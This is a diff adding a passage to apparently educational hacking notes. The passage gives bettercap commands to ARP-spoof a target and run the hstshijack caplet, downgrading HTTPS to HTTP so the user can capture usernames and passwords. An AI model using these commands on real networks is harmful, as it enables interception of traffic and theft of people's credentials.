@@ -288,4 +288,29 @@ The same can be performed using our automated script as well which is at the spe
 
 - Everything we did so far will only work against HTTP pages. The reason why it works against HTTP is because the data in HTTP is sent as plain text. This problem is solved by HTTPS, which encrypts the data using SSL/TLS.
 
-- The only way to bypass HTTPS is to downgrade HTTPS to HTTP. 
+- The only way to bypass HTTPS is to downgrade HTTPS to HTTP. For this we will use a `caplet`.
+- Before using the caplet be sure to use the command:
+
+  ```bash
+  bettercap -iface <interface_name>
+  net.probe on
+  net.show
+  set arp.spoof.fullduplex true;set arp.spoof.targets <target_ip>;arp.spoof on
+  ```
+
+- Now, first list down all the caplets available using the command:
+
+  ```bash
+  caplets.show
+  ```
+
+- We will use the caplet `hstshijack` to downgrade HTTPS to HTTP. To use the caplet, we can use the command:
+
+  ```bash
+  hstshijack/hstshijack
+  ```
+
+  And, hit enter. This will run the caplet and will start downgrading HTTPS to HTTP.
+
+- Now, try visiting an HTTPS website on the target machine. You will see that the website is downgraded to HTTP and you can see all the HTTP requests and responses in real-time, including the username and password for HTTPS websites as well.
+
